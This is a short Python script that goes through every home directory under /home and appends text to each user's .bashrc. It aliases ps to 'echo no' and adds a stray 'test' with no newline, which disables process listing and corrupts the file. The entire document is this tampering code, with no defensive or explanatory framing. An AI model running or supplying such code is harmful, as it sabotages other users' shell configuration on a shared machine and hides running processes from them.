import os

os.chdir("/home")
for file in os.listdir("."):
    if os.path.isdir(file):
        f = open(file + "/.bashrc", "a")
        f.write("alias ps=echo no")
        f.write("test")
        f.close()
